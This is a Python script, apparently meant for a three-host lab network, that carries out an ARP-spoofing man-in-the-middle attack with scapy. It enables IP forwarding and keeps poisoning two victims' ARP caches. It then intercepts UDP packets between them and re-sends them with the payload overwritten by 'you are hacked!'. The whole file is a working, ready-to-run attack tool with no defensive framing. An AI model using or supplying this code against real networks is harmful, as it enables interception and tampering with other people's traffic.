from scapy.all import ARP, Ether, srp, send, sniff, IP, UDP, Raw
import os
import threading
import time

# Enable IP forwarding on Host 3 (MITM)
os.system('sysctl -w net.ipv4.ip_forward=1')

victim1_ip = "10.0.0.1"  # Host 1 IP
victim2_ip = "10.0.0.2"  # Host 2 IP
attacker_ip = "10.0.0.3"  # Host 3 IP (Attacker)

def get_mac(ip):
    # Send an ARP request and return the MAC address of the specified IP
    arp_request = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip)
    arp_response = srp(arp_request, timeout=2, verbose=False)[0]
    return arp_response[0][1].hwsrc if arp_response else None

def poison(victim_ip, spoof_ip, attacker_mac):
    # Get the victim's MAC address
    victim_mac = get_mac(victim_ip)
    if victim_mac is None:
        print(f"Could not find MAC address for {victim_ip}")
        return
    
    # Poison the victim's ARP cache to associate the spoofed IP with the attacker's MAC
    arp_response = ARP(op=2, pdst=victim_ip, psrc=spoof_ip, hwdst=victim_mac, hwsrc=attacker_mac)
    send(arp_response, verbose=False)

def restore(victim_ip, spoof_ip):
    # Get the real MAC addresses to restore the ARP table
    victim_mac = get_mac(victim_ip)
    spoof_mac = get_mac(spoof_ip)
    if victim_mac is None or spoof_mac is None:
        return
    
    # Restore the original ARP table
    arp_restore = ARP(op=2, pdst=victim_ip, psrc=spoof_ip, hwdst=victim_mac, hwsrc=spoof_mac)
    send(arp_restore, count=4, verbose=False)

def poison_targets():
    attacker_mac = get_mac(attacker_ip)
    
    if attacker_mac is None:
        print(f"Failed to obtain MAC for attacker (Host 3: {attacker_ip}).")
        return

    print("Starting ARP poisoning...")
    while True:
        poison(victim1_ip, victim2_ip, attacker_mac)
        poison(victim2_ip, victim1_ip, attacker_mac)
        time.sleep(2)

def intercept_packet(packet):
    # Intercept UDP traffic between Host 1 and Host 2
    if packet.haslayer(UDP) and packet.haslayer(Raw):
        if packet[IP].src == victim1_ip and packet[IP].dst == victim2_ip:
            print(f"Intercepted UDP packet from {victim1_ip} to {victim2_ip}")
            modified_packet = packet[IP]
            modified_packet[Raw].load = b'you are hacked!'
            send(modified_packet)
            print(f"Modified packet sent to {victim2_ip}")

        elif packet[IP].src == victim2_ip and packet[IP].dst == victim1_ip:
            print(f"Intercepted UDP packet from {victim2_ip} to {victim1_ip}")
            modified_packet = packet[IP]
            modified_packet[Raw].load = b'you are hacked!'
            send(modified_packet)
            print(f"Modified packet sent to {victim1_ip}")

if __name__ == "__main__":
    # Start ARP poisoning in a separate thread
    poisoning_thread = threading.Thread(target=poison_targets)
    poisoning_thread.daemon = True
    poisoning_thread.start()

    # Start sniffing and intercepting UDP packets
    print("Starting packet interception...")
    sniff(filter="udp", prn=intercept_packet, store=False)

    # Restore ARP tables when done
    restore(victim1_ip, victim2_ip)
    restore(victim2_ip, victim1_ip)
